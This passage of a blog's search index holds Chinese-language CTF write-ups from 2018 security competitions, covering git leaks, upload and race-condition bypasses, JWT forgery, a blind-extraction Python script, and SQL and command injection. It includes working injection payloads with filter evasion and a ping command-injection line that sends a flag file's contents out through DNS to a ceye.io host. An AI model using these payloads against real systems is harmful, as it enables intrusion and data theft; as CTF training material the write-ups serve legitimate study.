method=&apos;post&apos; enctype=&apos;multipart/form-data&apos;&gt;&lt;input name=&apos;file&apos; type=&apos;file&apos;/&gt;&lt;input type=&apos;submit&apos; value=&apos;上传&apos; /&gt;&lt;/form&gt;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>金融行业网络安全比赛WP</title>
      <link href="/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/"/>
      <url>/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="babygit"><a href="#babygit" class="headerlink" title="babygit"></a>babygit</h1><p>从题目名称可以看出这个是git信息泄露的题目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure><p>利用git源码恢复工具进行恢复。<br><img src="/images/pasted-0.png" alt><br>使用git log命令查看版本信息，然后使用git checkout恢复到上一个版本。<br><img src="/images/pasted-1.png" alt><br><img src="/images/pasted-2.png" alt></p><h1 id="speed"><a href="#speed" class="headerlink" title="speed"></a>speed</h1><p>第二题是一道条件竞争漏洞的题目，注册后进入后台只有一个文件上传点，上传正常图片可以上传成功，但是上传.php文件会提示上传文件后缀非法,已删除所以我们要抢在文件被删除前访问才能获得flag。<br><img src="/images/pasted-3.png" alt></p><h1 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h1><p><a href="https://xz.aliyun.com/t/2456" target="_blank" rel="noopener">https://xz.aliyun.com/t/2456</a><br>修改下源码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests, re</span><br><span class="line"></span><br><span class="line">def calc(v1, v2, op, s):</span><br><span class="line">    u = &quot;http://54.223.83.192:8888/cgi-bin/calculate.py?&quot;</span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s, t=t)</span><br><span class="line">    # print payload</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    # print r.url</span><br><span class="line">    res = re.findall(&quot;&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;&quot;,</span><br><span class="line">                     r.content)[0].split(&apos;\n&apos;)[1]</span><br><span class="line">    assert (res != &apos;Invalid&apos;)</span><br><span class="line">    return res == &apos;True&apos;</span><br><span class="line">    # print r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(mid):</span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    return calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None):</span><br><span class="line">    assert (lo &gt;= 0)</span><br><span class="line">    if hi == None: hi = len(seq)</span><br><span class="line">    while lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // 2</span><br><span class="line">        # print lo, mid, hi, &quot;\t&quot;,</span><br><span class="line">        if check(seq[mid]): hi = mid</span><br><span class="line">        else: lo = mid + 1</span><br><span class="line">    return seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">v1, v2, op, s , t = &apos;x&apos;,&quot;+FLAG&lt;value1+source#&quot;, &quot;+&apos;&quot;, &apos;&apos;,&quot;1a69aa60224a7095ececda5c7c6834fc&quot;</span><br><span class="line"></span><br><span class="line">while (1):</span><br><span class="line">    flag += chr(bin_search() - 1)</span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure><h1 id="babyshop"><a href="#babyshop" class="headerlink" title="babyshop"></a>babyshop</h1><p>随便购买点商品，然后在卖出的时候修改商品数量让它溢出。<br><img src="/images/pasted-4.png" alt></p><h1 id="Bake-cookies"><a href="#Bake-cookies" class="headerlink" title="Bake cookies"></a>Bake cookies</h1><p>这题从名字可以看出是有关于COOKIE的,从标题看到JWT,JSON Web Token<br><img src="/images/pasted-6.png" alt><br>进去界面猜测账号密码，使用guest/guest登录成功了…弱口令,进去后抓包看COOKIE。<br><img src="/images/pasted-5.png" alt><br>明显是JSON Web Token,访问<a href="https://jwt.io去解密" target="_blank" rel="noopener">https://jwt.io去解密</a><br><img src="/images/pasted-7.png" alt><br>修改为<br>{<br>  “name”: “admin”,<br>  “admin”: “true”<br>}<br>后果COOKIE后提交发现报错信息貌似返回了密钥<br><img src="/images/pasted-8.png" alt><br>填写上密钥重新生成下提交<br><img src="/images/pasted-9.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南网2018预选赛部分writeup</title>
      <link href="/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/"/>
      <url>/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="绕过看门狗"><a href="#绕过看门狗" class="headerlink" title="绕过看门狗"></a>绕过看门狗</h1><p>一开始拿到链接尝试用and 1=1 来检测注入点，发现有过滤。<br><img src="/images/Snipaste_2018-07-29_13-41-26.png" alt><br>尝试利用注释+大小写来进行绕过注入拦截。<br><img src="/images/Snipaste_2018-07-29_13-43-55.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">检测字段</span><br><span class="line">/**/Union/**/Select/**/1,2,3,4,5#</span><br><span class="line">获取数据库敏感信息，当前数据库为news</span><br><span class="line">/**/Union/**/Select/**/1,database(),user(),version(),5#</span><br><span class="line">获取到一张tb_flag表。</span><br><span class="line">/**/Union/**/Select/**/1,(selEct/**/table_name/**/fRoM/**/infOrmation_schema.tables/**/whEre/**/TABLE_SCHEMA/**/=/**/‘news’/**/limit/**/1,1),3,4,5#</span><br><span class="line">获取到tb_flag表只有一个字段</span><br><span class="line">/**/Union/**/Select/**/1,(selEct/**/table_name/**/fRoM/**/infOrmation_schema.tables/**/whEre/**/TABLE_SCHEMA/**/=/**/‘news’/**/limit/**/1,1),3,4,5#</span><br><span class="line">获取到flag为flag&#123;1396265adbb760c86475304b98e3f61c&#125;</span><br><span class="line">/**/Union/**/Select/**/1,(selecT/**/*/**/frOm/**/tb_flag/**/limit 0,1),3,4,5#</span><br></pre></td></tr></table></figure><h1 id="你会ping吗？"><a href="#你会ping吗？" class="headerlink" title="你会ping吗？"></a>你会ping吗？</h1><p>访问Robots.txt 发现index.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;where_is_flag.php&quot;);echo &quot;ping&quot;;$ip =(string)$_GET[&apos;ping&apos;];$ip =str_replace(&quot;&gt;&quot;,&quot;0.0&quot;,$ip);system(&quot;ping  &quot;.$ip);</span><br></pre></td></tr></table></figure><h2 id="解题方式一"><a href="#解题方式一" class="headerlink" title="解题方式一"></a>解题方式一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.66/?ping=`cp where_is_flag.php 520.txt`</span><br></pre></td></tr></table></figure><h2 id="解题方式二"><a href="#解题方式二" class="headerlink" title="解题方式二"></a>解题方式二</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.66/?ping=`cat where_is_flag.php|sed &apos;s/\s/qqq/g&apos;`.****.ceye.io</span><br></pre></td></tr></table></figure><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>正常上传一张图片。提示请上传gif图片，猜测这里是检测上传文件头，直接打开一个.php文件在文件开头添加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p>就能获取flag</p><h1 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h1><p>右键查看源码发现source.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&apos;id&apos;]?waf($_GET[&apos;id&apos;]):1;</span><br><span class="line"></span><br><span class="line">function waf($var)&#123;</span><br><span class="line">if(stristr($_SERVER[‘HTTP_USER_AGENT’],‘sqlmap’))&#123;         </span><br><span class="line">    echo &quot;&lt;center&gt;hacker&lt;center&gt;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$var = preg_replace(‘/([^a-z]+)(union|from)/i’, ‘&amp;#160;$2’, $var);   </span><br><span class="line">return $var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取数据库名称</span><br><span class="line">\Nunion select 1,group_concat(schema_name),\Nfrom information_schema.schemata--+</span><br><span class="line">获取表</span><br><span class="line">\Nunion select 1,group_concat(table_name),\Nfrom information_schema.tables where TABLE_SCHEMA=database()--+</span><br><span class="line">获取字段名称</span><br><span class="line">\Nunion select 1,group_concat(column_name),\Nfrom information_schema.columns  WHERE table_name=&apos;flag&apos;--+</span><br><span class="line">获取flag</span><br><span class="line">\Nunion select 1,group_concat(flag),\Nfrom flag--+</span><br></pre></td></tr></table></figure><h1 id="dbappweb-webscan"><a href="#dbappweb-webscan" class="headerlink" title="dbappweb-webscan"></a>dbappweb-webscan</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?act=news&amp;id=-1 union select 1,group_concat(column_name),user() from information_schema.columns  WHERE table_name=&apos;ctf&apos;--+</span><br><span class="line">index.php?act=news&amp;id=-1 union select 1,title,content from ctf limit 1,1--+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/07/28/hello-world/"/>
      <url>/2018/07/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>以前学习过的知识，一段时间不用就会忘记，加上平时没有做笔记的习惯，写这个Blog也是为了记录学习吧。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
